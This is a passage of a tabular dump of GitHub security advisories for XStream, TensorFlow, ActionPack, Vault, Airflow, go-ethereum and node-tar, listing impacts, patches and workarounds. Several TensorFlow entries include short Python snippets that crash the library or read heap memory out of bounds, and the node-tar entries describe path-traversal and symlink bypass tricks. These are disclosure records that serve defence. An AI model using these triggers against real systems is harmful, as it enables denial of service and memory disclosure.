If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.18.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39152](https://x-stream.github.io/CVE-2021-39152.html).

### Credits
m0d9 of the Security Team of Alibaba Cloud found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1739,34016,com.thoughtworks.xstream:xstream,GHSA-hph2-m3g5-xxv4,CVE-2021-39151,https://github.com/advisories/GHSA-hph2-m3g5-xxv4,high,2021-08-25 14:47:09 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39151](https://x-stream.github.io/CVE-2021-39151.html).

### Credits
Smi1e of DBAPPSecurity WEBIN Lab found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1740,34016,com.thoughtworks.xstream:xstream,GHSA-cxfm-5m4g-x7xp,CVE-2021-39150,https://github.com/advisories/GHSA-cxfm-5m4g-x7xp,high,2021-08-25 14:47:19 UTC,A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host,"### Impact
The vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream with a Java runtime version 14 to 8. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.18.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39150](https://x-stream.github.io/CVE-2021-39150.html).

### Credits
Lai Han of NSFOCUS security team found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1741,34016,com.thoughtworks.xstream:xstream,GHSA-3ccq-5vw3-2p6x,CVE-2021-39149,https://github.com/advisories/GHSA-3ccq-5vw3-2p6x,high,2021-08-25 14:47:28 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39149](https://x-stream.github.io/CVE-2021-39149.html).

### Credits
Lai Han of NSFOCUS security team found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1742,34016,com.thoughtworks.xstream:xstream,GHSA-qrx8-8545-4wg2,CVE-2021-39148,https://github.com/advisories/GHSA-qrx8-8545-4wg2,high,2021-08-25 14:47:38 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39148](https://x-stream.github.io/CVE-2021-39148.html).

### Credits
wh1t3p1g from TSRC (Tencent Security Response Center) found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1743,34016,com.thoughtworks.xstream:xstream,GHSA-h7v4-7xg3-hxcc,CVE-2021-39147,https://github.com/advisories/GHSA-h7v4-7xg3-hxcc,high,2021-08-25 14:47:46 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39147](https://x-stream.github.io/CVE-2021-39147.html).

### Credits
wh1t3p1g from TSRC (Tencent Security Response Center) found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1744,34016,com.thoughtworks.xstream:xstream,GHSA-p8pq-r894-fm8f,CVE-2021-39146,https://github.com/advisories/GHSA-p8pq-r894-fm8f,high,2021-08-25 14:47:57 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39146](https://x-stream.github.io/CVE-2021-39146.html).

### Credits
Ceclin and YXXX from the Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1745,34016,com.thoughtworks.xstream:xstream,GHSA-8jrj-525p-826v,CVE-2021-39145,https://github.com/advisories/GHSA-8jrj-525p-826v,high,2021-08-25 14:48:12 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39145](https://x-stream.github.io/CVE-2021-39145.html).

### Credits
李安诺 (Li4n0) from Alibaba Cloud Security Team and Smi1e of DBAPPSecurity WEBIN Lab found and reported the issue independently to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1746,34016,com.thoughtworks.xstream:xstream,GHSA-j9h8-phrw-h4fh,CVE-2021-39144,https://github.com/advisories/GHSA-j9h8-phrw-h4fh,high,2021-08-25 14:48:19 UTC,XStream is vulnerable to a Remote Command Execution attack,"### Impact
The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39144](https://x-stream.github.io/CVE-2021-39144.html).

### Credits

Ceclin and YXXX from the Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Email us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1747,34016,com.thoughtworks.xstream:xstream,GHSA-g5w6-mrj7-75h2,CVE-2021-39141,https://github.com/advisories/GHSA-g5w6-mrj7-75h2,high,2021-08-25 14:48:31 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39141](https://x-stream.github.io/CVE-2021-39141.html).

### Credits
Ceclin and YXXX from the Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1748,34016,com.thoughtworks.xstream:xstream,GHSA-6wf9-jmg9-vxcc,CVE-2021-39140,https://github.com/advisories/GHSA-6wf9-jmg9-vxcc,moderate,2021-08-25 14:48:39 UTC,XStream can cause a Denial of Service,"### Impact
The vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39140](https://x-stream.github.io/CVE-2021-39140.html).

### Credits
The vulnerability was discovered and reported by Lai Han of nsfocus security team.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1749,34016,com.thoughtworks.xstream:xstream,GHSA-64xx-cq4q-mf44,CVE-2021-39139,https://github.com/advisories/GHSA-64xx-cq4q-mf44,high,2021-08-25 14:48:47 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. A user is only affected if using the version out of the box with JDK 1.7u21 or below.  However, this scenario can be adjusted easily to an external Xalan that works regardless of the version of the Java runtime. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-39139](https://x-stream.github.io/CVE-2021-39139.html).

### Credits
Lai Han of nsfocus security team found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
1750,20741,tensorflow,GHSA-gh6x-4whr-2qv4,CVE-2021-37639,https://github.com/advisories/GHSA-gh6x-4whr-2qv4,high,2021-08-25 14:44:05 UTC,Null pointer dereference and heap OOB read in operations restoring tensors,"### Impact
When restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:

```python
import tensorflow as tf

tf.raw_ops.Restore(
  file_pattern=['/tmp'],
  tensor_name=[], 
  default_value=21,
  dt=tf.int,
  preferred_shard=1)
```
  
The same undefined behavior can be triggered by `tf.raw_ops.RestoreSlice`:
  
```python
import tensorflow as tf

tf.raw_ops.RestoreSlice(
  file_pattern=['/tmp'],
  tensor_name=[], 
  shape_and_slice='2',
  dt=inp.array([tf.int]),
  preferred_shard=1)
```

Alternatively, attackers can read memory outside the bounds of heap allocated data by providing some tensor names but not enough for a successful restoration:

```python
import tensorflow as tf

tf.raw_ops.Restore(
  file_pattern=['/tmp'],
  tensor_name=['x'], 
  default_value=21,
  dt=tf.int,
  preferred_shard=42)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/save_restore_tensor.cc#L158-L159) retrieves the tensor list corresponding to the `tensor_name` user controlled input and immediately retrieves the tensor at the restoration index (controlled via `preferred_shard` argument). This occurs without validating that the provided list has enough values.

If the list is empty this results in dereferencing a null pointer (undefined behavior). If, however, the list has some elements, if the restoration index is outside the bounds this results in heap OOB read.

### Patches 
We have patched the issue in GitHub commit [9e82dce6e6bd1f36a57e08fa85af213e2b2f2622](https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1751,20741,tensorflow,GHSA-hwr7-8gxx-fj5p,CVE-2021-37638,https://github.com/advisories/GHSA-hwr7-8gxx-fj5p,high,2021-08-25 14:44:09 UTC,Null pointer dereference in `RaggedTensorToTensor`,"### Impact
Sending invalid argument for `row_partition_types` of `tf.raw_ops.RaggedTensorToTensor` API results in a null pointer dereference and undefined behavior:

```python
import tensorflow as tf

tf.raw_ops.RaggedTensorToTensor(
  shape=1,
  values=10,
  default_value=21,
  row_partition_tensors=tf.constant([0,0,0,0]),
  row_partition_types=[])
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L328) accesses the first element of a user supplied list of values without validating that the provided list is not empty.

### Patches
We have patched the issue in GitHub commit [301ae88b331d37a2a16159b65b255f4f9eb39314](https://github.com/tensorflow/tensorflow/commit/301ae88b331d37a2a16159b65b255f4f9eb39314).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1752,20741,tensorflow,GHSA-c9qf-r67m-p7cg,CVE-2021-37637,https://github.com/advisories/GHSA-c9qf-r67m-p7cg,high,2021-08-25 14:44:12 UTC,Null pointer dereference in `CompressElement`,"### Impact
It is possible to trigger a null pointer dereference in TensorFlow by passing an invalid input to `tf.raw_ops.CompressElement`:

```python
import tensorflow as tf

tf.raw_ops.CompressElement(components=[[]])
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/data/compression_utils.cc#L34) was accessing the size of a buffer obtained from the return of a separate function call before validating that said buffer is valid.

### Patches
We have patched the issue in GitHub commit [5dc7f6981fdaf74c8c5be41f393df705841fb7c5](https://github.com/tensorflow/tensorflow/commit/5dc7f6981fdaf74c8c5be41f393df705841fb7c5).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for  more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360. Concurrently, it was resolved in `master` branch as it was also discovered internally and fixed before the report was handled.",pip
1753,20741,tensorflow,GHSA-hp4c-x6r7-6555,CVE-2021-37636,https://github.com/advisories/GHSA-hp4c-x6r7-6555,moderate,2021-08-25 14:44:14 UTC,Floating point exception in `SparseDenseCwiseDiv`,"### Impact
The implementation of `tf.raw_ops.SparseDenseCwiseDiv` is vulnerable to a division by 0 error:

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseDenseCwiseDiv( 
  sp_indices=np.array([[4]]),
  sp_values=np.array([-400]),
  sp_shape=np.array([647.]),
  dense=np.array([0]))
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/a1bc56203f21a5a4995311825ffaba7a670d7747/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc#L56) uses a common class for all binary operations but fails to treat the division by 0 case separately.

### Patches
We have patched the issue in GitHub commit [d9204be9f49520cdaaeb2541d1dc5187b23f31d9](https://github.com/tensorflow/tensorflow/commit/d9204be9f49520cdaaeb2541d1dc5187b23f31d9).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1754,20741,tensorflow,GHSA-cgfm-62j4-v4rf,CVE-2021-37635,https://github.com/advisories/GHSA-cgfm-62j4-v4rf,high,2021-08-25 14:44:17 UTC,Heap out of bounds access in sparse reduction operations,"### Impact
The implementation of sparse reduction operations in TensorFlow can trigger accesses outside of bounds of heap allocated data:

```python
import tensorflow as tf

x = tf.SparseTensor(
      indices=[[773, 773, 773], [773, 773, 773]],
      values=[1, 1],
      dense_shape=[337, 337, 337])
tf.sparse.reduce_sum(x, 1)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/a1bc56203f21a5a4995311825ffaba7a670d7747/tensorflow/core/kernels/sparse_reduce_op.cc#L217-L228) fails to validate that each reduction group does not overflow and that each corresponding index does not point to outside the bounds of the input tensor.

### Patches
We have patched the issue in GitHub commit [87158f43f05f2720a374f3e6d22a7aaa3a33f750](https://github.com/tensorflow/tensorflow/commit/87158f43f05f2720a374f3e6d22a7aaa3a33f750). 

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1755,18865,actionpack,GHSA-2rqw-v265-jf8c,CVE-2021-22942,https://github.com/advisories/GHSA-2rqw-v265-jf8c,high,2021-08-26 20:36:51 UTC,Open Redirect in ActionPack,"# Overview

There is a possible open redirect vulnerability in the Host Authorization
middleware in Action Pack. This vulnerability has been assigned the CVE
identifier CVE-2021-22942.

Versions Affected: >= 6.0.0.
Not affected: < 6.0.0
Fixed Versions: 6.1.4.1, 6.0.4.1

# Impact

Specially crafted “X-Forwarded-Host” headers in combination with certain
“allowed host” formats can cause the Host Authorization middleware in
Action Pack to redirect users to a malicious website.

Impacted applications will have allowed hosts with a leading dot.
For example, configuration files that look like this:

```ruby
config.hosts <<  '.EXAMPLE.com'
```

When an allowed host contains a leading dot, a specially crafted
Host header can be used to redirect to a malicious website.

This vulnerability is similar to CVE-2021-22881, but CVE-2021-22881 did not
take in to account domain name case sensitivity.

# Releases

The fixed releases are available at the normal locations.

# Workarounds

In the case a patch can’t be applied, the following monkey patch can be
used in an initializer:

```ruby
module ActionDispatch
  class HostAuthorization
    HOSTNAME = /[a-z0-9.-]+|\[[a-f0-9]*:[a-f0-9.:]+\]/i
    VALID_ORIGIN_HOST = /\A(#{HOSTNAME})(?::\d+)?\z/
    VALID_FORWARDED_HOST = /(?:\A|,[ ]?)(#{HOSTNAME})(?::\d+)?\z/

    private
      def authorized?(request)
        origin_host =
          request.get_header(""HTTP_HOST"")&.slice(VALID_ORIGIN_HOST, 1) || """"
        forwarded_host =
          request.x_forwarded_host&.slice(VALID_FORWARDED_HOST, 1) || """"
        @permissions.allows?(origin_host) &&
          (forwarded_host.blank? || @permissions.allows?(forwarded_host))
      end
  end
end
```
",rubygems
1756,22634,vault,GHSA-6239-28c2-9mrm,CVE-2021-38554,https://github.com/advisories/GHSA-6239-28c2-9mrm,moderate,2021-08-30 17:22:38 UTC,Improper Removal of Sensitive Information Before Storage or Transfer in HashiCorp Vault,HashiCorp Vault and Vault Enterprise’s UI erroneously cached and exposed user-viewed secrets between sessions in a single shared browser. Fixed in 1.8.0 and pending 1.7.4 / 1.6.6 releases.,go
1757,20810,apache-airflow,GHSA-m6h2-jx9v-58w6,CVE-2021-35936,https://github.com/advisories/GHSA-m6h2-jx9v-58w6,moderate,2021-08-30 16:25:57 UTC,Missing Authorization in Apache Airflow,"If remote logging is not used, the worker (in the case of CeleryExecutor) or the scheduler (in the case of LocalExecutor) runs a Flask logging server and is listening on a specific port and also binds on 0.0.0.0 by default. This logging server had no authentication and allows reading log files of DAG jobs. This issue affects Apache Airflow < 2.1.2.",pip
1758,22961,go-ethereum,GHSA-9856-9gg9-qcmq,CVE-2021-39137,https://github.com/advisories/GHSA-9856-9gg9-qcmq,moderate,2021-08-30 16:15:41 UTC,Consensus flaw during block processing,"### Impact

A vulnerability in the Geth EVM could cause a node to reject the canonical chain. 

### Description 

A memory-corruption bug within the EVM can cause a consensus error, where vulnerable nodes obtain a different `stateRoot` when processing a maliciously crafted transaction. This, in turn, would lead to the chain being split in two forks.

All Geth versions supporting the London hard fork are vulnerable (which predates London), so all users should update.

This bug was exploited on Mainnet at block 13107518, leading to a minority chain split. 

### Patches

A patch is included in the `v1.10.8` release.
The exact patch to fix the issue is contained within this [commit](https://github.com/ethereum/go-ethereum/pull/23381/commits/4d4879cafd1b3c906fc184a8c4a357137465128f)

### Workarounds

No workarounds exist, save to update and/or apply the patch commit. 

### References. 

Post-mortem [write-up](https://github.com/ethereum/go-ethereum/blob/master/docs/postmortems/2021-08-22-split-postmortem.md).

### Credits

The bug was found by @guidovranken (working for [Sentnl](https://sentnl.io/) during an audit of the [Telos EVM](https://www.telos.net/evm)) and reported via bounty@ethereum.org.

### For more information
If you have any questions or comments about this advisory:

* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum/)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)
",go
1759,16466,tar,GHSA-5955-9wpr-37jh,CVE-2021-37713,https://github.com/advisories/GHSA-5955-9wpr-37jh,high,2021-08-31 16:05:05 UTC,Arbitrary File Creation/Overwrite on Windows via insufficient relative path sanitization,"### Impact

Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

node-tar aims to guarantee that any file whose location would be outside of the extraction target directory is not extracted. This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.

This logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\path`.  If the drive letter does not match the extraction target, for example `D:\extraction\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.

Additionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.

This only affects users of `node-tar` on Windows systems.

### Patches

4.4.18 || 5.0.10 || 6.1.9

### Workarounds

There is no reasonable way to work around this issue without performing the same path normalization procedures that node-tar now does.

Users are encouraged to upgrade to the latest patched versions of node-tar, rather than attempt to sanitize paths themselves.

### Fix

The fixed versions strip path roots from all paths prior to being resolved against the extraction target folder, even if such paths are not ""absolute"".

Additionally, a path starting with a drive letter and then two dots, like `c:../`, would bypass the check for `..` path portions.  This is checked properly in the patched versions.

Finally, a defense in depth check is added, such that if the `entry.absolute` is outside of the extraction taret, and we are not in preservePaths:true mode, a warning is raised on that entry, and it is skipped.  Currently, it is believed that this check is redundant, but it did catch some oversights in development.
",npm
1760,16466,tar,GHSA-qq89-hq3f-393p,CVE-2021-37712,https://github.com/advisories/GHSA-qq89-hq3f-393p,high,2021-08-31 16:05:17 UTC,Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning using symbolic links,"### Impact
Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

node-tar aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.

This logic was insufficient when extracting tar files that contained two directories and a symlink with names containing unicode values that normalized to the same value. Additionally, on Windows systems, long path portions would resolve to the same file system entities as their 8.3 ""short path"" counterparts. A specially crafted tar archive could thus include directories with two forms of the path that resolve to the same file system entity, followed by a symbolic link with a name in the first form, lastly followed by a file using the second form. It led to bypassing node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.

The v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.

### Patches

6.1.9 || 5.0.10 || 4.4.18

### Workarounds

Users may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.

```js
const tar = require('tar')

tar.x({
  file: 'archive.tgz',
  filter: (file, entry) => {
    if (entry.type === 'SymbolicLink') {
      return false
    } else {
      return true
    }
  }
})
```

Users are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.

#### Fix

The problem is addressed in the following ways, when comparing paths in the directory cache and path reservation systems:

1. The `String.normalize('NFKD')` method is used to first normalize all unicode to its maximally compatible and multi-code-point form.
2. All slashes are normalized to `/` on Windows systems (on posix systems, `\` is a valid filename character, and thus left intact).
3. When a symbolic link is encountered on Windows systems, the entire directory cache is cleared.  Collisions related to use of 8.3 short names to replace directories with other (non-symlink) types of entries may make archives fail to extract properly, but will not result in arbitrary file writes.
",npm
1761,16466,tar,GHSA-9r2w-394v-53qc,CVE-2021-37701,https://github.com/advisories/GHSA-9r2w-394v-53qc,high,2021-08-31 16:05:27 UTC,Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning using symbolic links,"### Impact

Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.

This logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\` and `/` characters as path separators, however `\` is a valid filename character on posix systems.

By first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.

Additionally, a similar confusion could arise on case-insensitive filesystems.  If a tar archive contained a directory at `FOO`, followed by a symbolic link named `foo`, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the filesystem, but _not_ from the internal directory cache, as it would not be treated as a cache hit.  A subsequent file entry within the `FOO` directory would then be placed in the target of the symbolic link, thinking that the directory had already been created. 

These issues were addressed in releases 4.4.16, 5.0.8 and 6.1.7.

The v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.

### Patches

4.4.16 || 5.0.8 || 6.1.7

### Workarounds

Users may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.

```js
const tar = require('tar')

tar.x({
  file: 'archive.tgz',
  filter: (file, entry) => {
    if (entry.type === 'SymbolicLink') {
      return false
    } else {
      return true
    }
  }
})
```

Users are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.

### Fix

The problem is addressed in the following ways:

1. All paths are normalized to use `/` as a path separator, replacing `\` with `/` on Windows systems, and leaving `\` intact in the path on posix systems.  This is performed in depth, at every level of the program where paths are consumed.
2. Directory cache pruning is performed case-insensitively.  This _may_ result in undue cache misses on case-sensitive file systems, but the performance impact is negligible.

#### Caveat

Note that this means that the `entry` objects exposed in various parts of tar's API will now always use `/` as a path separator, even on Windows systems.  This is not expected to cause problems, as `/` is a valid path separator on Windows systems, but _may_ result in issues if `entry.path` is compared against a path string coming from some other API such as `fs.realpath()` or `path.resolve()`.

Users are encouraged to always normalize paths using a well-tested method such as `path.resolve()` before comparing paths to one another.",npm
